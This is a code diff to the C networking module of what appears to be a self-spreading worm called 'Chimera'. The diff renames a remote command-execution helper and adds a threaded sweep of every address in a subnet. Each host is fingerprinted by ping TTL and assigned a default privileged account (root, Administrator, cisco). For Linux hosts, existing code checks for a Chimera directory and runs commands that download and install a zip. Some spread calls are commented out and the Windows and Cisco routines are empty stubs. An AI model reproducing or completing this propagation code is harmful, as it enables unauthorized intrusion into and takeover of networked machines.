@@ -1,5 +1,44 @@
 #include "net.h"
 
+typedef struct ThreadData {
+    int index;
+    const char* subnet;
+    const char* password;
+} ThreadData;
+
+void* spread_worker(void* data) {
+    ThreadData* thread_data = (ThreadData*)data;
+    int index = thread_data->index;
+    const char* subnet = thread_data->subnet;
+    const char* password = thread_data->password;
+
+    char host_ip[MAX_COMMAND_SIZE];
+    int ret = snprintf(host_ip, sizeof(host_ip), "%s.%d", subnet, index);
+    if (ret >= sizeof(host_ip)) {
+        fprintf(stderr, "Host string too long\n");
+        return NULL;
+    }
+
+    enum os_type host_os = get_os_type(host_ip);
+    if (host_os != UNKNOWN) {
+        char* username = NULL;
+        if (host_os == LINUX) {
+            username = "root";
+            // spread_linux(host_ip, username, password);
+        } else if (host_os == WINDOWS) {
+            username = "Administrator";
+            // spread_windows(host_ip, username, password);
+        } else {
+            username = "cisco";
+            // spread_cisco(host_ip, username, password);
+        }
+        printf("%s\n", username);
+
+    }
+    free(data);
+    return NULL;
+}
+
 /**
  * Connects to a remote host and executes a command.
  *
@@ -9,7 +48,7 @@
  * @param command The command to execute on the remote host.
  * @param remote_os The operating system of the remote host.
  */
-char* establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
+char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
     char command_string[MAX_COMMAND_SIZE];
     int ret;
 
@@ -88,7 +127,7 @@ char* establish_connection(const char* host, const char* username, const char* p
 void spread_linux(const char* host, const char* username, const char* password) {
     // Check if the "Chimera" directory exists on the remote Linux machine
     const char* check_chimera_dir_cmd = "if [ ! -d \"Chimera\" ]; then echo \"NOT_EXIST\"; fi";
-    char* output = establish_connection(host, username, password, check_chimera_dir_cmd, LINUX);
+    char* output = remote_execution(host, username, password, check_chimera_dir_cmd, LINUX);
 
     if (output != NULL && strcmp(output, "NOT_EXIST\n") == 0) {
         // Download the zip file from the URL
@@ -103,7 +142,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
             return;
         }
 
-        output = establish_connection(host, username, password, command_string, LINUX);
+        output = remote_execution(host, username, password, command_string, LINUX);
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
@@ -116,7 +155,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
             return;
         }
 
-        output = establish_connection(host, username, password, command_string, LINUX);
+        output = remote_execution(host, username, password, command_string, LINUX);
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
@@ -129,7 +168,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
             return;
         }
 
-        output = establish_connection(host, username, password, command_string, LINUX);
+        output = remote_execution(host, username, password, command_string, LINUX);
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
@@ -142,7 +181,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
             return;
         }
 
-        output = establish_connection(host, username, password, command_string, LINUX);
+        output = remote_execution(host, username, password, command_string, LINUX);
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
@@ -156,68 +195,53 @@ void spread_linux(const char* host, const char* username, const char* password) 
     }
 }
 
-
-static void spread_windows(const char* host, const char* username, const char* password, const char* command) {
+void spread_windows(const char* host, const char* username, const char* password) {
     // implementation for spreading to Windows host
 }
 
-static void spread_cisco(const char* host, const char* username, const char* password, const char* command) {
+void spread_cisco(const char* host, const char* username, const char* password) {
     // implementation for spreading to Windows host
 }
 
 /**
- * Connects to a remote host and executes a command.
+ * Tries to spread Chimera across the subnet
  *
  * @param subnet The subnet of the remote hosts. i.e. 192.168.1
- * @param username The username to use for the connection.
  * @param password The password to use for the connection.
  * @param command The command to execute on the remote host.
  * @param remote_os The operating system of the remote host.
  */
-void spread(const char* subnet, const char* password, const char* command) {
-    char command_string[MAX_COMMAND_SIZE];
-    int ret;
-    enum os_type remote_os;
-    char* username = NULL;
 
-    for(int i=0; i<=255; i++) {
-        char host[MAX_COMMAND_SIZE];
-        ret = snprintf(host, sizeof(host), "%s.%d", subnet, i);
-        if (ret >= sizeof(host)) {
-            fprintf(stderr, "Host string too long\n");
-            continue;
-        }
-        remote_os = get_os_type(host);
-        if (remote_os == UNKNOWN) {
-            continue;
-        } else if (remote_os == LINUX) {
-            // establish_connection(host, username, password, command);
-            username = "root";
-            spread_linux(host, username, password);
+void spread(const char* subnet, const char* password) {
+    pthread_t threads[255];
 
-        } else if (remote_os == WINDOWS) {
-            username = "root";
-            spread_windows(host, username, password, command);
+    for (int i = 1; i < 255; i++) {
+        ThreadData* data = (ThreadData*)malloc(sizeof(ThreadData));
+        data->index = i;
+        data->subnet = subnet;
+        data->password = password;
+        pthread_create(&threads[i], NULL, spread_worker, data);
+    }
 
-        } else {
-            username = "cisco";
-            spread_windows(host, username, password, command);
-
-        }
+    for (int i = 1; i < 255; i++) {
+        pthread_join(threads[i], NULL);
     }
 }
+
 
 enum os_type get_os_type(const char *ip_address) {
     char command[MAX_BUF_SIZE];
     #if defined(_WIN32) || defined(_WIN64)
-        snprintf(command, sizeof(command), "ping -n 1 %s", ip_address);
+        snprintf(command, sizeof(command), "ping -n 1 -w 5 %s", ip_address);
         const char* ttl_str = "TTL=";
     #elif defined(__linux__)
-        snprintf(command, sizeof(command), "ping -c 1 %s", ip_address);
+        snprintf(command, sizeof(command), "ping -c 1 -W 5 %s", ip_address);
         const char* ttl_str = "ttl=";
     #else
         #error "Unsupported platform"
     #endif
+    
+    // fprintf(stderr, "Command: %s\n", command);
 
     FILE *ping_output = popen(command, "r");
     if (ping_output == NULL) {
@@ -237,13 +261,17 @@ enum os_type get_os_type(const char *ip_address) {
     int ttl = -1;
 
     char* ttl_start = strstr(output_buf, ttl_str);
-    if (ttl_start != NULL) {
-        // Extract TTL from the output buffer
-        char *ttl_val_str = ttl_start + strlen(ttl_str);
-        if (sscanf(ttl_val_str, "%d", &ttl) != 1) {
-            fprintf(stderr, "Failed to parse TTL: %s\n", ttl_val_str);
-            return UNKNOWN;
-        }
+    if (ttl_start == NULL) {
+        // TTL/ttl value not found in the output
+        // fprintf(stderr, "Failed to find TTL/ttl value in ping output\n");
+        return UNKNOWN;
+    }
+
+    // Extract TTL/ttl from the output buffer
+    char *ttl_val_str = ttl_start + strlen(ttl_str);
+    if (sscanf(ttl_val_str, "%d", &ttl) != 1) {
+        // fprintf(stderr, "Failed to parse TTL/ttl value: %s\n", ttl_val_str);
+        return UNKNOWN;
     }
 
     switch (ttl) {
